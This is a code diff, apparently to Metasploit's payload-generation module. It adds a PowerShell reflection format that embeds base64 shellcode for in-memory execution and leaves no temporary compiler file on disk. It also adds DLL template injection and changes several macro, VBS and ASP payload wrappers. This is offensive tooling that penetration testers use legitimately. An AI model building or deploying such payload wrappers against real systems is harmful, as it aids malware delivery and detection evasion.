@@ -469,14 +469,24 @@ require 'msf/core/exe/segment_injector'
     # Allow the user to specify their own DLL template
     set_template_default(opts, "template_x86_windows.dll")
     opts[:exe_type] = :dll
-    exe_sub_method(code,opts)
+
+    if opts[:inject]
+       return self.to_win32pe(framework, code, opts)
+    else
+      return exe_sub_method(code,opts)
+    end
   end
 
   def self.to_win64pe_dll(framework, code, opts={})
     # Allow the user to specify their own DLL template
     set_template_default(opts, "template_x64_windows.dll")
     opts[:exe_type] = :dll
-    exe_sub_method(code,opts)
+
+    if opts[:inject]
+      raise RuntimeError, 'Template injection unsupported for x64 DLLs'
+    else
+      return exe_sub_method(code,opts)
+    end
   end
 
   #
@@ -782,7 +792,7 @@ require 'msf/core/exe/segment_injector'
     return read_replace_script_template("to_exe.vba.template", hash_sub)
   end
 
-def self.to_vba(framework,code,opts={})
+  def self.to_vba(framework,code,opts={})
     hash_sub = {}
     hash_sub[:var_myByte]		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
     hash_sub[:var_myArray]		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
@@ -920,6 +930,33 @@ def self.to_vba(framework,code,opts={})
     return read_replace_script_template("to_mem_old.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
   end
 
+  #
+  # Reflection technique prevents the temporary .cs file being created for the .NET compiler
+  # Tweaked by shellster
+  # Originally from PowerSploit
+  #
+  def self.to_win32pe_psh_reflection(framework, code, opts={})
+    # Intialize rig and value names
+    rig = Rex::RandomIdentifierGenerator.new()
+    rig.init_var(:func_get_proc_address)
+    rig.init_var(:func_get_delegate_type)
+    rig.init_var(:var_code)
+    rig.init_var(:var_module)
+    rig.init_var(:var_procedure)
+    rig.init_var(:var_unsafe_native_methods)
+    rig.init_var(:var_parameters)
+    rig.init_var(:var_return_type)
+    rig.init_var(:var_type_builder)
+    rig.init_var(:var_buffer)
+    rig.init_var(:var_hthread)
+
+    hash_sub = rig.to_h
+
+    hash_sub[:b64shellcode] = Rex::Text.encode_base64(code)
+
+    return read_replace_script_template("to_mem_pshreflection.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
+  end
+
   def self.to_win32pe_vbs(framework, code, opts={})
     to_exe_vbs(to_win32pe(framework, code, opts), opts)
   end
@@ -934,6 +971,7 @@ def self.to_vba(framework,code,opts={})
     spawn = opts[:spawn] || 2
     exe_name = Rex::Text.rand_text_alpha(8) + ".exe"
     zip = Rex::Zip::Jar.new
+    zip.add_sub("metasploit") if opts[:random]
     paths = [
       [ "metasploit", "Payload.class" ],
     ]
@@ -1040,6 +1078,7 @@ def self.to_vba(framework,code,opts={})
     hash_sub[:var_proc]          = Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_fperm]         = Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_fdel]          = Rex::Text.rand_text_alpha(rand(8)+8)
+    hash_sub[:var_exepatharray]  = Rex::Text.rand_text_alpha(rand(8)+8)
 
     # Specify the payload in hex as an extra file..
     payload_hex = exe.unpack('H*')[0]
@@ -1594,14 +1633,14 @@ def self.to_vba(framework,code,opts={})
 
     case fmt
     when 'asp'
-      exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
+      exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
       output = Msf::Util::EXE.to_exe_asp(exe, exeopts)
 
     when 'aspx'
         output = Msf::Util::EXE.to_mem_aspx(framework, code, exeopts)
 
     when 'aspx-exe'
-      exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
+      exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
       output = Msf::Util::EXE.to_exe_aspx(exe, exeopts)
 
     when 'dll'
@@ -1610,6 +1649,7 @@ def self.to_vba(framework,code,opts={})
         when ARCH_X86_64  then to_win64pe_dll(framework, code, exeopts)
         when ARCH_X64     then to_win64pe_dll(framework, code, exeopts)
         end
+
     when 'exe'
       output = case arch
         when ARCH_X86,nil then to_win32pe(framework, code, exeopts)
@@ -1627,6 +1667,7 @@ def self.to_vba(framework,code,opts={})
     when 'exe-small'
       output = case arch
         when ARCH_X86,nil then to_win32pe_old(framework, code, exeopts)
+        when ARCH_X86_64,ARCH_X64 then to_win64pe(framework, code, exeopts)
         end
 
     when 'exe-only'
@@ -1688,15 +1729,15 @@ def self.to_vba(framework,code,opts={})
       output = Msf::Util::EXE.to_vba(framework, code, exeopts)
 
     when 'vba-exe'
-      exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
+      exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
       output = Msf::Util::EXE.to_exe_vba(exe)
 
     when 'vbs'
-      exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
+      exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
       output = Msf::Util::EXE.to_exe_vbs(exe, exeopts.merge({ :persist => false }))
 
     when 'loop-vbs'
-      exe = exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
+      exe = exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
       output = Msf::Util::EXE.to_exe_vbs(exe, exeopts.merge({ :persist => true }))
 
     when 'war'
@@ -1711,6 +1752,9 @@ def self.to_vba(framework,code,opts={})
 
     when 'psh-net'
       output = Msf::Util::EXE.to_win32pe_psh_net(framework, code, exeopts)
+      
+    when 'psh-reflection'
+      output = Msf::Util::EXE.to_win32pe_psh_reflection(framework, code, exeopts)
 
     end
 
@@ -1734,6 +1778,7 @@ def self.to_vba(framework,code,opts={})
       "msi-nouac",
       "psh",
       "psh-net",
+      "psh-reflection",
       "vba",
       "vba-exe",
       "vbs",
